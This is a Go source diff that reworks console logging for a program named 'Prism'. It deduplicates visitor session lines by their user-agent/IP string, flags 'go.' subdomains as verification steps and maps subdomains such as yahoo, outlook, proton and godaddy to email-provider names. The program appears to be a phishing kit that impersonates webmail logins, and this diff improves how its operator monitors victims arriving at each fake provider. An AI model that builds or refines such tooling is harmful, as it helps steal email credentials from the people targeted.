@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"strings"
+	"time"
 )
 
 // consoleLogWriter keeps production console output intentionally small.
@@ -14,6 +15,8 @@ import (
 type consoleLogWriter struct {
 	dst io.Writer
 }
+
+const visitorLogDedupeWindow = 5 * time.Minute
 
 func installCompactConsole() {
 	originalStdout := os.Stdout
@@ -46,26 +49,48 @@ func filterStdout(reader *os.File, dst io.Writer) {
 	buf := make([]byte, 0, 64*1024)
 	scanner.Buffer(buf, 1024*1024)
 
+	// This map affects console output only. Prism's real session creation and
+	// routing behavior are not changed. Multiple subdomain sessions generated
+	// by one browser during the same page load are collapsed into one visitor
+	// event using the existing UA+IP text from the original session log line.
+	seenVisitors := make(map[string]time.Time)
+
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
 		if line == "" {
 			continue
 		}
 
-		// Session creation is useful operational context, but the original line
-		// contains the full UA/IP and is too noisy. Collapse it to one clean line.
 		if strings.Contains(line, "New session:") {
-			index := fieldBetween(line, "[+] [", "] New session:")
 			rest := fieldAfter(line, "New session:")
 			id := ""
 			if fields := strings.Fields(rest); len(fields) > 0 {
 				id = fields[0]
 			}
 
-			out := "🟢 SESSION  •  New visitor"
-			if index != "" {
-				out += "  •  #" + index
+			// Everything after the generated session ID is the existing browser/IP
+			// signature. Use it only to prevent duplicate console messages.
+			visitorKey := strings.TrimSpace(rest)
+			if id != "" {
+				visitorKey = strings.TrimSpace(strings.TrimPrefix(visitorKey, id))
 			}
+
+			now := time.Now()
+			if visitorKey != "" {
+				if lastSeen, exists := seenVisitors[visitorKey]; exists && now.Sub(lastSeen) < visitorLogDedupeWindow {
+					continue
+				}
+				seenVisitors[visitorKey] = now
+
+				// Opportunistic cleanup keeps the logging-only map bounded.
+				for key, lastSeen := range seenVisitors {
+					if now.Sub(lastSeen) >= visitorLogDedupeWindow {
+						delete(seenVisitors, key)
+					}
+			}
+			}
+
+			out := now.Format("2006/01/02 15:04:05") + " 🟢 VISITOR   •  New"
 			if id != "" {
 				out += "  •  ID " + id
 			}
@@ -86,8 +111,7 @@ func filterStdout(reader *os.File, dst io.Writer) {
 }
 
 func compactLogLine(line string) (string, bool) {
-	// Convert the existing verbose root-request debug message into the one
-	// page-navigation event we actually want to see.
+	// Convert verbose root-request debug messages into compact page events.
 	if strings.Contains(line, "Request reached Go!") {
 		host := fieldBetween(line, "Host: ", " | Path:")
 		path := fieldBetween(line, "Path: ", " | Method:")
@@ -98,7 +122,12 @@ func compactLogLine(line string) (string, bool) {
 			if i := strings.Index(line, "["); i > 0 {
 				prefix = strings.TrimSpace(line[:i]) + " "
 			}
-			return prefix + "🌐 PAGE     •  Landed  •  " + host + path, true
+
+			if strings.HasPrefix(strings.ToLower(host), "go.") {
+				return prefix + "🔐 VERIFY    •  " + host, true
+			}
+
+			return prefix + "📨 PROVIDER  •  " + providerDisplayName(host), true
 		}
 		return "", false
 	}
@@ -123,6 +152,55 @@ func compactLogLine(line string) (string, bool) {
 	}
 
 	return "", false
+}
+
+func providerDisplayName(host string) string {
+	host = strings.ToLower(strings.TrimSpace(host))
+	subdomain := host
+	if i := strings.IndexByte(host, '.'); i >= 0 {
+		subdomain = host[:i]
+	}
+	if i := strings.IndexByte(subdomain, '-'); i >= 0 {
+		subdomain = subdomain[:i]
+	}
+
+	switch subdomain {
+	case "yahoo":
+		return "Yahoo"
+	case "microsoft", "msa", "outlook", "office":
+		return "Microsoft"
+	case "turbify":
+		return "Turbify"
+	case "rackspace":
+		return "Rackspace"
+	case "zoho":
+		return "Zoho"
+	case "proton", "protonmail":
+		return "Proton Mail"
+	case "fastmail":
+		return "Fastmail"
+	case "tuta", "tutanota":
+		return "Tuta"
+	case "gmx":
+		return "GMX"
+	case "mailcom":
+		return "Mail.com"
+	case "yandex":
+		return "Yandex"
+	case "godaddy":
+		return "GoDaddy"
+	case "ionos":
+		return "IONOS"
+	case "namecheap":
+		return "Namecheap"
+	case "cpanel", "roundcube", "webmail", "custom":
+		return "Webmail"
+	}
+
+	if subdomain == "" {
+		return "Unknown"
+	}
+	return strings.ToUpper(subdomain[:1]) + subdomain[1:]
 }
 
 func fieldBetween(s, start, end string) string {
